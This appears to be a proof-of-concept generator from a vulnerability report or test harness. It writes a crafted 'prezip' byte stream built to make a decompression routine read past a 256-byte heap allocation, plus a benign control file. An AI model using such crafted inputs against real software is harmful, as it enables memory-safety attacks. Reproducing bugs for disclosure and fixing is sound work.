#!/bin/bash
# Generate the crafted and safe prezip streams used by run-all.sh.
set -eu
cd "$(dirname "$0")"
mkdir -p evidence
python3 - <<'PY'
# Crafted: format 0x02 <prefix=0x1e/30> then three 0xff ADV bytes and a
# final 0x41; the ADV walk runs 30+255+255+65 = 605 bytes from cur.str's
# 256-byte malloc, so the pinned ADV macro reads past the allocation.
crafted = bytes([0x02, 0x1e, 0xff, 0xff, 0x41]) + b'MISHE-75818-OOB-' + bytes([0x1f, 0xff])
open('evidence/crafted.bin', 'wb').write(crafted)
# Safe control: encoder round-trip output for "HELLO\nWORLD\n".
safe = bytes([0x02, 0x00]) + b'HELLO\x00WORLD\x00' + bytes([0x1f, 0xff])
open('evidence/crafted-clean.bin', 'wb').write(safe)
PY
